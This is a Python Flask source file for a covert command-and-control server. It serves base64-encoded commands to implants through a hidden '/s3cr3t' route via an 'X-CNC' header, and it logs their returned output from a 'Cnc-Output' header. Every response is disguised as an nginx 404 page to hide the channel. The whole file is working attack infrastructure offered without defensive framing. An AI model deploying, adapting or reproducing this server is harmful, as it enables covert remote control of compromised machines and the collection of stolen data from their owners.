from flask import Flask, redirect, url_for, request, Response, render_template, make_response
from werkzeug.serving import WSGIRequestHandler
from werkzeug.exceptions import HTTPException
from base64 import b64encode, b64decode

app = Flask(__name__, template_folder='templates')
command_file = "./commands.txt"
command_output_file = "./output.txt"

def read_from_file(file_name, r_type="r"):
    with open(file_name, r_type) as rf:
        contents = rf.read()

    return contents

def write_to_file(file_name, contents, w_type="w"):
    with open(file_name, w_type) as wf:
        wf.write(contents)

@app.route('/s3cr3t', methods=['PUT', 'OPTIONS'])
def s3cr3t_cnc():
    # OPTIONS = Accepting CNC result
    resp = make_response(render_template('404.html'))
    resp.headers.set('Server', 'nginx')
    if request.method == 'OPTIONS':
        # Get CNC results
        foo = dict(request.headers)
        if foo.get('Cnc-Output', None) != None:
            command_output = b64decode(foo['Cnc-Output'])
            command_output = b"\n\n\n\n\n\n"+command_output
            write_to_file(command_output_file, command_output, w_type="ab")

        return resp, 404


    # PUT = Sending CNC commands
    elif request.method == 'PUT':
        # Set the command in the headers and in base64
        command = read_from_file(command_file,r_type="rb")
        resp.headers.set(b'X-CNC', b64encode(command))
        return resp, 404
    else:
        return resp, 404

@app.errorhandler(Exception)
def page_404(e):
    resp = make_response(render_template('404.html'))
    resp.headers.set('Server', 'nginx')
    return resp, 404


if __name__ == '__main__':
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    app.run(port=8000)
